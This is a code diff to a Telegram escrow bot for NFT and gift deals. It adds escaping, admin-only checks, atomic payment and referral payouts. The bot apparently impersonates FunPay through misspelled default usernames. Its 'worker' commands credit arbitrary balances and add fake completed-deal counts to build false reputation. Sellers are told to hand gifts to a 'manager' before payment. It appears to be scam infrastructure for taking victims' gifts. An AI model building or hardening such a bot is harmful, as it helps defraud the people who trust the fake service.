@@ -1,8 +1,11 @@
 import asyncio
+import html
+import json
 import logging
 import os
 import random
 import string
+from datetime import datetime
 from typing import Optional, Dict, Any
 
 from dotenv import load_dotenv
@@ -36,6 +39,19 @@ load_dotenv()
 BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
 SUPPORT_USERNAME = os.getenv("SUPPORT_USERNAME", "FunPayDeaIsSupport").strip().lstrip("@")
 BOT_USERNAME = os.getenv("BOT_USERNAME", "FunpayOfficaIsbot").strip().lstrip("@")
+ADMIN_IDS = {
+    int(x.strip())
+    for x in os.getenv("ADMIN_IDS", "8679634925").split(",")
+    if x.strip().isdigit()
+}
+
+
+def is_admin(user_id: int) -> bool:
+    return user_id in ADMIN_IDS
+
+
+def esc(val: Any) -> str:
+    return html.escape(str(val or ""))
 
 LOGO_PATH = os.path.join(os.path.dirname(__file__), "Logo", "photo_2026-11-11_21-48-59.jpg")
 
@@ -652,14 +668,30 @@ async def cmd_start(message: Message, state: FSMContext):
             await message.answer("✅ Эта сделка уже успешно завершена.", reply_markup=get_back_keyboard())
             return
 
-        # При подключении связываем партнера со сделкой
-        await db.accept_deal(deal_id, user_id)
+        # Защита от перехвата сделки третьим лицом
+        if deal.get("buyer_id") and deal["buyer_id"] != user_id:
+            user_lang = await db.get_user_language(user_id)
+            err_msg = (
+                "❌ This deal is already taken by another participant."
+                if user_lang == "en"
+                else "❌ Эта сделка уже занята другим участником."
+            )
+            await message.answer(err_msg, reply_markup=get_back_keyboard(user_lang))
+            return
+
+        # При подключении связываем партнера со сделкой (если ещё свободна)
+        if deal["status"] == "created" and not deal.get("buyer_id"):
+            accepted = await db.accept_deal(deal_id, user_id)
+            if not accepted:
+                await message.answer("❌ Эта сделка уже занята или отменена.", reply_markup=get_back_keyboard())
+                return
 
         creator_role = deal.get("creator_role", "seller")
         is_paid = deal.get("is_paid", 0)
         gift_sent = deal.get("gift_sent", 0)
         creator_user = await db.get_user(deal["creator_id"])
-        creator_username = f"@{creator_user['username']}" if (creator_user and creator_user.get("username")) else deal["creator_name"]
+        raw_creator_name = f"@{creator_user['username']}" if (creator_user and creator_user.get("username")) else deal["creator_name"]
+        creator_username = esc(raw_creator_name)
         creator_deals = creator_user.get("completed_deals", 0) if creator_user else 0
         curr = get_curr_info(deal.get("currency", "RUB"))
 
@@ -677,7 +709,7 @@ async def cmd_start(message: Message, state: FSMContext):
             buyer_lang = creator_lang
             seller_lang = user_lang
 
-        visitor_name = f"@{username}" if username else full_name
+        visitor_name = esc(f"@{username}" if username else full_name)
 
         # Логика в зависимости от роли создателя сделки:
         # Если создатель ПРОДАВЕЦ — обратный порядок: продавец сначала передает подарок менеджеру, затем покупатель оплачивает и завершает сделку!
@@ -1031,20 +1063,31 @@ async def select_deal_currency(callback: CallbackQuery, state: FSMContext):
 @dp.message(CreateDealStates.waiting_for_amount)
 async def process_amount(message: Message, state: FSMContext):
     """Шаг 5: Валидация суммы и расчет комиссии 3%."""
-    text = message.text.strip().replace(",", ".")
     data = await state.get_data()
     curr_code = data.get("currency", "RUB")
+    curr = get_curr_info(curr_code)
+    min_amount = curr.get("min", 1)
     deal_lang = data.get("deal_lang") or await db.get_user_language(message.from_user.id)
 
+    if not message.text:
+        err_msg = (
+            f"❌ Enter a valid positive number (min {min_amount} {curr_code}):"
+            if deal_lang == "en"
+            else f"❌ Введите корректное положительное число (мин. {min_amount} {curr_code}):"
+        )
+        await message.answer(err_msg, parse_mode="HTML")
+        return
+
+    text = message.text.strip().replace(",", ".")
     try:
         amount = float(text)
-        if amount <= 0:
+        if amount < min_amount:
             raise ValueError()
     except ValueError:
         err_msg = (
-            f"❌ Enter a valid positive number for amount in {curr_code}:"
+            f"❌ Minimum deal amount is {min_amount} {curr_code}. Enter a valid amount:"
             if deal_lang == "en"
-            else f"❌ Введите корректное положительное число для суммы в {curr_code}:"
+            else f"❌ Минимальная сумма сделки — {min_amount} {curr_code}. Введите корректную сумму:"
         )
         await message.answer(err_msg, parse_mode="HTML")
         return
@@ -1084,9 +1127,22 @@ async def process_nft_link(message: Message, state: FSMContext):
     """Шаг 6: Создание карточки сделки."""
     data = await state.get_data()
     deal_lang = data.get("deal_lang") or await db.get_user_language(message.from_user.id)
-    item_link = message.text.strip()
-    if not item_link:
-        err_msg = "❌ Please send a valid link to NFT or gift:" if deal_lang == "en" else "❌ Пожалуйста, отправьте корректную ссылку на NFT или подарок:"
+    item_link = (message.text or "").strip()
+    is_valid_link = bool(
+        item_link
+        and (
+            item_link.startswith("https://")
+            or item_link.startswith("http://")
+            or item_link.startswith("t.me/")
+            or item_link.startswith("@")
+        )
+    )
+    if not is_valid_link:
+        err_msg = (
+            "❌ Please send a valid link (e.g. t.me/nft/FreshSocks-98543):"
+            if deal_lang == "en"
+            else "❌ Пожалуйста, отправьте корректную ссылку (например: t.me/nft/FreshSocks-98543):"
+        )
         await message.answer(err_msg)
         return
 
@@ -1135,7 +1191,7 @@ async def process_nft_link(message: Message, state: FSMContext):
             f"💰 <b>Deal amount:</b> {amount:.2f} {currency}\n"
             f"📊 <b>Service fee (3%):</b> {fee:.2f} {currency}\n"
             f"💵 <b>To be received by seller:</b> {payout:.2f} {currency}\n"
-            f"📦 <b>Description:</b>\n<code>{item_link}</code>\n\n"
+            f"📦 <b>Description:</b>\n<code>{esc(item_link)}</code>\n\n"
             f"🔗 <b>Invite link for {counterpart_label}:</b>\n"
             f"<code>{direct_link}</code>\n\n"
             f"Or invite via inline: type <code>@{BOT_USERNAME} #{deal_id}</code> in any chat\n\n"
@@ -1156,7 +1212,7 @@ async def process_nft_link(message: Message, state: FSMContext):
             f"💰 <b>Сумма сделки:</b> {amount:.2f} {currency}\n"
             f"📊 <b>Комиссия сервиса (3%):</b> {fee:.2f} {currency}\n"
             f"💵 <b>К получению продавцом:</b> {payout:.2f} {currency}\n"
-            f"📦 <b>Описание:</b>\n<code>{item_link}</code>\n\n"
+            f"📦 <b>Описание:</b>\n<code>{esc(item_link)}</code>\n\n"
             f"🔗 <b>Ссылка для {counterpart_label}:</b>\n"
             f"<code>{direct_link}</code>\n\n"
             f"Или пригласите через инлайн: введите <code>@{BOT_USERNAME} #{deal_id}</code> в любом чате\n\n"
@@ -1180,6 +1236,47 @@ async def process_nft_link(message: Message, state: FSMContext):
 
 # ------------------ Оплата сделки покупателем ------------------
 
+async def credit_referral_bonus(bot: Bot, deal: dict, curr_key: str, curr: Dict[str, Any]):
+    """Начисляет 50% от комиссии сервиса рефереру продавца (если есть)."""
+    fee = float(deal.get("fee", 0.0) or 0.0)
+    if fee <= 0:
+        return
+    bonus = round(fee * 0.5, 2)
+    if bonus <= 0:
+        return
+
+    creator_role = deal.get("creator_role", "seller")
+    seller_id = deal["creator_id"] if creator_role == "seller" else deal.get("buyer_id")
+    buyer_id = deal.get("buyer_id") if creator_role == "seller" else deal["creator_id"]
+
+    # Начисляем рефереру продавца (или покупателя, если у продавца нет реферера)
+    credited_refs = set()
+    for uid in (seller_id, buyer_id):
+        if not uid:
+            continue
+        u = await db.get_user(uid)
+        ref_id = u.get("referrer_id") if u else None
+        if ref_id and ref_id not in credited_refs and ref_id not in (seller_id, buyer_id):
+            credited_refs.add(ref_id)
+            await db.change_user_balance(ref_id, curr_key, bonus)
+            ref_lang = await db.get_user_language(ref_id)
+            msg = (
+                f"🎁 <b>Referral bonus!</b>\n\n"
+                f"Your referral completed deal <b>#{deal['deal_id']}</b>.\n"
+                f"💰 Credited: <b>+{bonus:.2f} {curr['code']}</b> (50% of service fee)"
+                if ref_lang == "en"
+                else
+                f"🎁 <b>Реферальное начисление!</b>\n\n"
+                f"Ваш реферал завершил сделку <b>#{deal['deal_id']}</b>.\n"
+                f"💰 Начислено: <b>+{bonus:.2f} {curr['code']}</b> (50% от комиссии)"
+            )
+            try:
+                await bot.send_message(chat_id=ref_id, text=msg, parse_mode="HTML")
+            except Exception:
+                pass
+            break
+
+
 @dp.callback_query(F.data.startswith("pay_deal_"))
 async def pay_deal_handler(callback: CallbackQuery):
     deal_id = callback.data.replace("pay_deal_", "").strip()
@@ -1201,6 +1298,15 @@ async def pay_deal_handler(callback: CallbackQuery):
 
     if deal.get("is_paid", 0):
         await callback.answer("ℹ️ Сделка уже оплачена." if lang != "en" else "ℹ️ Deal is already paid.", show_alert=True)
+        return
+
+    creator_role = deal.get("creator_role", "seller")
+    expected_buyer_id = deal.get("buyer_id") if creator_role == "seller" else deal.get("creator_id")
+    if expected_buyer_id != buyer_id:
+        await callback.answer(
+            "❌ Only the buyer of this deal can pay." if lang == "en" else "❌ Оплатить сделку может только покупатель этой сделки.",
+            show_alert=True
+        )
         return
 
     curr_code = deal.get("currency", "RUB")
@@ -1233,20 +1339,27 @@ async def pay_deal_handler(callback: CallbackQuery):
         await callback.answer(err_text, show_alert=True)
         return
 
-    # Если средств достаточно: списываем баланс и помечаем сделку оплаченной
-    await db.change_user_balance(buyer_id, curr_key, -required_amount)
-    await db.mark_deal_paid(deal_id)
+    # Атомарно помечаем сделку оплаченной (защита от двойного списания при быстром клике)
+    paid_now = await db.mark_deal_paid(deal_id)
+    if not paid_now:
+        await callback.answer("ℹ️ Сделка уже оплачена." if lang != "en" else "ℹ️ Deal is already paid.", show_alert=True)
+        return
 
-    creator_role = deal.get("creator_role", "seller")
+    await db.change_user_balance(buyer_id, curr_key, -required_amount)
+
     gift_already_sent = deal.get("gift_sent", 0)
 
     # ОБРАТНЫЙ ПОРЯДОК: если создатель сделки ПРОДАВЕЦ и подарок уже передан менеджеру,
     # оплата покупателем сразу успешно завершает сделку!
     if creator_role == "seller" and gift_already_sent:
-        await db.complete_deal(deal_id)
+        completed_now = await db.complete_deal(deal_id)
+        if not completed_now:
+            await callback.answer("✅ Эта сделка уже завершена." if lang != "en" else "✅ This deal is already completed.", show_alert=True)
+            return
         seller_id = deal["creator_id"]
         payout = round(deal["amount"] - deal.get("fee", 0.0), 2)
         await db.change_user_balance(seller_id, curr_key, payout)
+        await credit_referral_bonus(callback.bot, deal, curr_key, curr)
 
         seller_lang = await db.get_user_language(seller_id) if seller_id else "ru"
         await callback.answer("✅ Сделка успешно оплачена и завершена!" if lang != "en" else "✅ Deal paid and completed!", show_alert=True)
@@ -1514,15 +1627,19 @@ async def finish_deal_handler(callback: CallbackQuery):
         await callback.answer(err_msg, show_alert=True)
         return
 
-    # Завершаем сделку
-    await db.complete_deal(deal_id)
+    # Завершаем сделку атомарно
+    completed_now = await db.complete_deal(deal_id)
+    if not completed_now:
+        await callback.answer("Deal already completed." if lang == "en" else "Эта сделка уже завершена.", show_alert=True)
+        return
 
-    # Зачисляем выплату продавцу на баланс
+    # Зачисляем выплату продавцу на баланс и реферальный бонус
     curr = get_curr_info(deal.get("currency", "RUB"))
     payout = round(deal["amount"] - deal.get("fee", 0.0), 2)
+    curr_key = str(deal.get("currency", "RUB")).lower()
     if seller_id:
-        curr_key = str(deal.get("currency", "RUB")).lower()
         await db.change_user_balance(seller_id, curr_key, payout)
+    await credit_referral_bonus(callback.bot, deal, curr_key, curr)
 
     seller_lang = await db.get_user_language(seller_id) if seller_id else "ru"
     buyer_lang = await db.get_user_language(buyer_id) if buyer_id else "ru"
@@ -1590,10 +1707,27 @@ async def cancel_deal_handler(callback: CallbackQuery):
         await callback.answer("Deal already completed." if lang == "en" else "Сделка уже успешно завершена.", show_alert=True)
         return
 
+    if deal.get("gift_sent", 0):
+        await callback.answer(
+            "❌ Gift already transferred to manager. Cancellation is disabled, contact support."
+            if lang == "en"
+            else "❌ Подарок уже передан менеджеру, отмена невозможна. Обратитесь в техподдержку.",
+            show_alert=True
+        )
+        return
+
     user_id = callback.from_user.id
     success = await db.cancel_deal(deal_id, user_id)
 
     if success:
+        # Если покупатель уже оплатил сделку (и подарок еще не передан), возвращаем средства
+        if deal.get("is_paid", 0):
+            creator_role = deal.get("creator_role", "seller")
+            refund_buyer_id = deal["buyer_id"] if creator_role == "seller" else deal["creator_id"]
+            if refund_buyer_id:
+                curr_key = str(deal.get("currency", "RUB")).lower()
+                await db.change_user_balance(refund_buyer_id, curr_key, deal["amount"])
+
         text = (
             f"❌ You cancelled deal <b>#{deal_id}</b>."
             if lang == "en"
@@ -1936,13 +2070,23 @@ async def process_withdraw_amount(message: Message, state: FSMContext):
     curr_key = data.get("withdraw_curr_key", "rub")
     req_val = data.get("withdraw_req", "Не указаны")
     curr = get_curr_info(curr_key)
+    min_amount = curr.get("min", 1)
+
+    if not message.text:
+        msg = f"❌ Введите корректное число (мин. {min_amount} {curr['code']}):" if lang != "en" else f"❌ Please enter a valid number (min {min_amount} {curr['code']}):"
+        await message.answer(msg)
+        return
 
     try:
         amount = float(message.text.strip().replace(",", "."))
-        if amount <= 0:
+        if amount < min_amount:
             raise ValueError()
     except ValueError:
-        msg = "❌ Введите корректное положительное число:" if lang != "en" else "❌ Please enter a valid positive number:"
+        msg = (
+            f"❌ Минимальная сумма вывода — {min_amount} {curr['code']}. Введите корректное число:"
+            if lang != "en"
+            else f"❌ Minimum withdrawal is {min_amount} {curr['code']}. Please enter a valid number:"
+        )
         await message.answer(msg)
         return
 
@@ -1982,7 +2126,7 @@ async def process_withdraw_amount(message: Message, state: FSMContext):
         success_text = (
             f"✅ <b>Withdrawal request created successfully!</b>\n\n"
             f"💰 <b>Amount:</b> <code>{amount:.2f} {curr['code']}</code>\n"
-            f"💳 <b>Requisites:</b> <code>{req_val}</code>\n"
+            f"💳 <b>Requisites:</b> <code>{esc(req_val)}</code>\n"
             f"📊 <b>Remaining balance:</b> <code>{new_bal:.2f} {curr['code']}</code>\n"
             f"⏳ <b>Status:</b> In processing (typically 5 to 30 min)\n\n"
             f"Technical support: @{SUPPORT_USERNAME}"
@@ -1991,13 +2135,28 @@ async def process_withdraw_amount(message: Message, state: FSMContext):
         success_text = (
             f"✅ <b>Заявка на вывод средств успешно создана!</b>\n\n"
             f"💰 <b>Сумма к выводу:</b> <code>{amount:.2f} {curr['code']}</code>\n"
-            f"💳 <b>Реквизиты:</b> <code>{req_val}</code>\n"
+            f"💳 <b>Реквизиты:</b> <code>{esc(req_val)}</code>\n"
             f"📊 <b>Остаток на балансе:</b> <code>{new_bal:.2f} {curr['code']}</code>\n"
             f"⏳ <b>Статус:</b> В обработке (обычно 5–30 минут)\n\n"
             f"Менеджер техподдержки: @{SUPPORT_USERNAME}"
         )
 
     await message.answer(success_text, reply_markup=back_kb, parse_mode="HTML")
+
+    # Уведомляем администратора о заявке на вывод
+    u_tag = f"@{esc(message.from_user.username)}" if message.from_user.username else esc(message.from_user.full_name)
+    admin_notif = (
+        f"💸 <b>Новая заявка на вывод средств</b>\n\n"
+        f"👤 Пользователь: {u_tag} (<code>{user_id}</code>)\n"
+        f"💰 Сумма: <b>{amount:.2f} {curr['code']}</b>\n"
+        f"💳 Реквизиты: <code>{esc(req_val)}</code>\n"
+        f"📊 Остаток: <code>{new_bal:.2f} {curr['code']}</code>"
+    )
+    for admin_id in ADMIN_IDS:
+        try:
+            await message.bot.send_message(chat_id=admin_id, text=admin_notif, parse_mode="HTML")
+        except Exception:
+            pass
 
 
 @dp.callback_query(F.data == "transactions")
@@ -2255,6 +2414,9 @@ async def prompt_set_requisite(callback: CallbackQuery, state: FSMContext):
 async def process_requisite_value(message: Message, state: FSMContext):
     user_id = message.from_user.id
     lang = await db.get_user_language(user_id)
+    if not message.text or not message.text.strip():
+        await message.answer("❌ Отправьте реквизиты текстом:" if lang != "en" else "❌ Please send requisites as text:")
+        return
     data = await state.get_data()
     req_key = data.get("current_req_key", "req_rub")
     value = message.text.strip()
@@ -2268,7 +2430,7 @@ async def process_requisite_value(message: Message, state: FSMContext):
     if lang == "en":
         thanks_text = (
             f"✅ <b>{name} saved successfully:</b>\n"
-            f"<code>{value}</code>"
+            f"<code>{esc(value)}</code>"
         )
         back_kb = InlineKeyboardMarkup(
             inline_keyboard=[
@@ -2279,7 +2441,7 @@ async def process_requisite_value(message: Message, state: FSMContext):
     else:
         thanks_text = (
             f"✅ <b>{name} успешно сохранены:</b>\n"
-            f"<code>{value}</code>"
+            f"<code>{esc(value)}</code>"
         )
         back_kb = InlineKeyboardMarkup(
             inline_keyboard=[
@@ -2317,11 +2479,11 @@ async def show_profile(callback: CallbackQuery):
             parts = dt_part.split("-")
             reg_date = f"{parts[2]}.{parts[1]}.{parts[0]}" if len(parts) == 3 else str(raw_created)[:10]
         else:
-            reg_date = "12.11.2026"
+            reg_date = datetime.now().strftime("%d.%m.%Y")
     except Exception:
-        reg_date = "12.11.2026"
+        reg_date = datetime.now().strftime("%d.%m.%Y")
 
-    username_str = f"@{user.get('username')}" if user.get("username") else (user.get("full_name") or "Пользователь")
+    username_str = esc(f"@{user.get('username')}" if user.get("username") else (user.get("full_name") or "Пользователь"))
 
     e_prof = get_emoji("profile_badge", "👤")
     e_id = get_emoji("id_badge", "🆔")
@@ -2848,7 +3010,7 @@ async def back_to_menu_handler(callback: CallbackQuery, state: FSMContext):
 @dp.message(Command("balance"))
 async def worker_balance_cmd(message: Message, state: FSMContext):
     """
-    Команда /balance для воркеров (пополнение баланса):
+    Команда /balance для админа (пополнение баланса):
     /balance - меню выбора валюты и ввода суммы пополнения
     /balance 5000 - пополнить на 5000 RUB свой баланс
     /balance 5000 uah - пополнить на 5000 UAH
@@ -2856,6 +3018,8 @@ async def worker_balance_cmd(message: Message, state: FSMContext):
     /balance @username 5000 rub - пополнить баланс пользователю
     /balance 12345678 100 stars - пополнить баланс по Telegram ID
     """
+    if not is_admin(message.from_user.id):
+        return
     await state.clear()
     args = message.text.split()[1:]
     if args:
@@ -2929,6 +3093,9 @@ async def worker_balance_cmd(message: Message, state: FSMContext):
 
 @dp.callback_query(F.data.startswith("w_bal_curr_"))
 async def worker_bal_select_curr(callback: CallbackQuery, state: FSMContext):
+    if not is_admin(callback.from_user.id):
+        await callback.answer("⛔ Доступ запрещён.", show_alert=True)
+        return
     curr_key = callback.data.replace("w_bal_curr_", "").strip()
     curr = get_curr_info(curr_key)
     await state.update_data(w_curr_key=curr_key)
@@ -2947,6 +3114,12 @@ async def worker_bal_select_curr(callback: CallbackQuery, state: FSMContext):
 
 @dp.message(WorkerStates.waiting_for_balance_amount)
 async def worker_bal_save_amount(message: Message, state: FSMContext):
+    if not is_admin(message.from_user.id):
+        await state.clear()
+        return
+    if not message.text:
+        await message.answer("❌ Пожалуйста, введите положительное число (например: <code>1000</code>):", parse_mode="HTML")
+        return
     data = await state.get_data()
     curr_key = data.get("w_curr_key", "rub")
     curr = get_curr_info(curr_key)
@@ -2972,11 +3145,13 @@ async def worker_bal_save_amount(message: Message, state: FSMContext):
 @dp.message(Command("deals"))
 async def worker_deals_cmd(message: Message, state: FSMContext):
     """
-    Команда /deals для воркеров (добавление проведённых сделок):
+    Команда /deals для админа (добавление проведённых сделок):
     /deals - интерактивный ввод количества сделок
     /deals 6 - добавить 6 проведённых сделок себе
     /deals @username 6 - добавить 6 проведённых сделок пользователю
     """
+    if not is_admin(message.from_user.id):
+        return
     await state.clear()
     raw_args = message.text.split()[1:]
     if raw_args:
@@ -3025,6 +3200,12 @@ async def worker_deals_cmd(message: Message, state: FSMContext):
 
 @dp.message(WorkerStates.waiting_for_deals_count)
 async def worker_deals_save_count(message: Message, state: FSMContext):
+    if not is_admin(message.from_user.id):
+        await state.clear()
+        return
+    if not message.text:
+        await message.answer("❌ Введите число:", parse_mode="HTML")
+        return
     text_parts = message.text.strip().split()
     target_id = message.from_user.id
 
@@ -3065,7 +3246,7 @@ async def worker_deals_save_count(message: Message, state: FSMContext):
 
 # ------------------ Автоматический перехват кастомных эмодзи ------------------
 
-@dp.message(lambda msg: msg.entities and any(e.type == "custom_emoji" for e in msg.entities))
+@dp.message(lambda msg: msg.from_user and is_admin(msg.from_user.id) and msg.entities and any(e.type == "custom_emoji" for e in msg.entities))
 async def capture_custom_emojis_handler(message: Message):
     """
     При отправке или пересылке боту сообщения с кастомными эмодзи,
@@ -3151,6 +3332,7 @@ async def capture_custom_emojis_handler(message: Message):
 # ------------------ Запуск бота ------------------
 
 async def main():
+    global BOT_USERNAME
     if not BOT_TOKEN:
         logger.error("ОШИБКА: BOT_TOKEN не указан в файле .env!")
         return
@@ -3160,6 +3342,8 @@ async def main():
 
     bot = Bot(token=BOT_TOKEN)
     bot_info = await bot.get_me()
+    if bot_info.username:
+        BOT_USERNAME = bot_info.username
     logger.info(f"Бот @{bot_info.username} (ID: {bot_info.id}) успешно авторизован.")
 
     # Автоматическая загрузка кастомных эмодзи из наборов Topic Icons, GeometryDashPusab, NewsEmoji, etc.
